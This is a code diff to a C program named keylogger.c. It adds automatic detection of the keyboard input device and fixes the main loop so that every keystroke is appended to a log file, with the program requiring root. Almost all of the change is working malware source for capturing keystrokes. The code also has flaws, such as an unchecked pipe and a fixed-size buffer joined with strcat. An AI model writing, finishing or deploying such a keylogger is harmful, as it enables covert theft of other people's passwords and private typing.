+++ keylogger.c
@@ -10,7 +10,6 @@
 
 #include "key_util.h"
 #include "util.h"
-#include "device_detect.h"
 #include "config.h"
 
 #define KEY_RELEASE 0
@@ -18,6 +17,7 @@
 
 typedef struct input_event input_event;
 static void root_check();
+static char *get_keyboard_device_file_name();
 static int open_keyboard_device_file(char *device_file);
 
 /*Exit with return code -1 if user does not have root privileges*/
@@ -26,6 +26,27 @@ static void root_check() {
       printf("Must run as root! Exiting... \n");
       exit(-1);
    }
+}
+
+/*Detects and returns the name of the keyboard device file. (Asssumes the keyboard device file always has an EV of 120013)*/
+static char *get_keyboard_device_file_name() {
+    static const char *command =
+    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
+    "grep -B1 120013 |"
+    "grep -Eo event[0-9]+ |"
+    "tr '\\n' '\\0'";
+    
+    FILE *pipe = popen(command, "r");
+    if (pipe == NULL) {
+        printf("Could not determine keyboard device file");
+    }
+    
+    char result[20] = "/dev/input/";
+    char temp[9];
+    fgets(temp, 9, pipe);
+    
+    pclose(pipe);
+    return strdup(strcat(result, temp));
 }
 
 /*Opens the keyboard device file given, returns the file descriptor on success, otherwise print error and exit*/
@@ -38,17 +59,18 @@ static int open_keyboard_device_file(char *device_file) {
    return kb_fd;
 }
 
+
 int main(int argc, char **argv) {
    root_check();
    Config config;
    
     /*Retrieve and open keyboard device file*/
-    config->device_file = get_keyboard_device_file_name();
+    config.device_file = get_keyboard_device_file_name();
    int kb_fd = open_keyboard_device_file(config.device_file);
    assert(kb_fd > 0);
     
     /*Open log file*/
-   config->log_file = "keylogger.log";
+   config.log_file = "/log/keylogger.log";
    FILE *log_file = fopen(config.log_file, "a");
    if (log_file == NULL) {
       printf("Could not open log file. \nExiting...");
@@ -74,8 +96,8 @@ int main(int argc, char **argv) {
                shift_pressed++;
             }
             char *name = get_key_text(event.code, shift_pressed);
-            if (strcmp(name, UK) != 0) {
-               fprintf("%s", name);
+            if (strcmp(name, "\0") != 0) {
+               fprintf(log_file, "%s",name);
             }
          } else if (event.value == KEY_RELEASE) {
             if (is_shift(event.code)) {
